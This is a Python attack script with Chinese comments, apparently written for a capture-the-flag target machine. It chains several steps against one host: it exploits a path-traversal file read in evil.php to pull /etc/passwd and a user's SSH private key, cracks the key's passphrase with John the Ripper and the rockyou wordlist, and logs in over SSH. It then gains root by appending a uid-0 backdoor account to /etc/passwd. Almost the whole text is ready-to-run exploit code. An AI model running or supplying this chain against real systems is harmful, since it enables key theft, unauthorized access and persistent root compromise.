# 脚本介绍
# 该脚本通过利用目标服务器上的文件读取漏洞，获取指定用户的 SSH 私钥，然后使用 John the Ripper 工具破解私钥的密码短语，最后建立 SSH 连接并提权。

# 使用说明：在使用此脚本前，请根据您的环境修改以下参数
# host_ip: 目标服务器的 IP 地址
# user: 目标用户名 

# 第一步：利用远程文件读取目标用户的ssh私钥，并保存在本地

import requests
import os

host_ip='192.168.203.33'
evil_url=f'http://{host_ip}/secret/evil.php'
test_payload='command=../../../../../../../../../../etc/passwd'
user='mowree'

response=requests.get(f"{evil_url}?{test_payload}")
if 'root:x:0:0' in response.text:
    print(f"确认存在文件读取漏洞")

private_key=f'{user}_id_rsa'
key_payload=f'command=../../../../../../../../../../home/{user}/.ssh/id_rsa'
response=requests.get(f"{evil_url}?{key_payload}")
if 'BEGIN RSA PRIVATE KEY' in response.text:
        if os.path.exists(private_key) and os.path.getsize(private_key) > 0:
            print(f"{user}私钥已保存")
        else:
            with open(private_key,'w') as f:
                f.write(response.text.strip())
            print(f"{user}的私钥已保存至{private_key}")

os.chmod(private_key,0o600)
file_stat=os.stat(private_key)
print(f"{private_key}文件权限已设置为{oct(file_stat.st_mode)[-3:]}")



# 第二步：利用私钥连接靶机

# 用于通过代码实现与远程服务器的 SSH 连接
import paramiko
# 用于在代码中调用操作系统的命令行命令
import subprocess
from subprocess import check_output

def convert_ssh_key_to_john_format(key_path,hash_path):
    result=check_output(
        f"ssh2john {key_path} > {hash_path}",
        shell=True,
        stderr=subprocess.STDOUT, 
        text=True
    )
    print(f"成功生成john可识别的hash文件{hash_path}")
    return True


def crack_ssh_key(hash_path,wordlist_path):
    check_output(
        f"john --format=ssh --wordlist={wordlist_path} {hash_path}",
        shell=True,
        stderr=subprocess.STDOUT,
        text=True
    )
    result=check_output(
            f"john --format=ssh {hash_path} --show",
            shell=True,
            stderr=subprocess.STDOUT,
            text=True
    )
    passphrase = result.split(':')[1].strip() 
    print(f"成功破解私钥密码: {passphrase}")
    return passphrase

hash_key='mowree_id_rsa_hash'
wordlist_path='/usr/share/wordlists/rockyou.txt'

convert_ssh_key_to_john_format(private_key,hash_key)
passphrase=crack_ssh_key(hash_key,wordlist_path)
passphrase=passphrase.split('\n')[0]

ssh=paramiko.SSHClient()
key_obj=paramiko.RSAKey.from_private_key_file(private_key,password=passphrase)
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(hostname=host_ip,username=user,pkey=key_obj)
print("SSH login successful!")


# 第三步：通过向/etc/passwd写入新用户提权
print("开始提权")
root_user='hack666'
root_passwd='123456'
stdin,stdout,stderr=ssh.exec_command(f'perl -le "print crypt({root_passwd},\\"addedsalt\\")"')
hash_result=stdout.read().decode().strip()
print(f"生成的password盐值为{hash_result}")   
print(hash_result)
add_root_user=f'echo "{root_user}:{hash_result}:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd'
stdin,stdout,stderr=ssh.exec_command(add_root_user)
error_output=stderr.read().decode()
if error_output:
     print(f"添加用户失败:{error_output}")
else:
     print(f"添加root用户成功 {root_user}/{root_passwd}")
     
os.system(f"sudo ssh -i {private_key} {user}@{host_ip} -t \"su {root_user}\"")
